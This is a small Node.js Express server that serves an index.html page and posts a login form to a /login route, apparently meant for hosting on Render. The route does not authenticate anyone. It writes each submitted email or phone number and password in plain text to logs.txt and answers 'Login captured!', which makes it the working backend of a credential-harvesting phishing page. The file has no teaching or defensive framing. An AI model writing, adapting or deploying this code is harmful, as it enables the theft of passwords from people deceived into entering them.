const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const path = require('path');

const app = express();

// Parse form data
app.use(bodyParser.urlencoded({ extended: true }));

// Serve static files (like index.html)
app.use(express.static(__dirname));

// Serve homepage
app.get('/', (req, res) => {
res.sendFile(path.join(__dirname, 'index.html'));
});

// Handle form submission
app.post('/login', (req, res) => {
const email = req.body.email;
const password = req.body.password;

const data = `Email/Phone: ${email}\nPassword: ${password}\n\n`;

fs.appendFileSync('logs.txt', data);

res.send('Login captured!');
});

// ✅ IMPORTANT: use Render port or fallback to 3000
const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
console.log(`Server running on port ${PORT}`);
});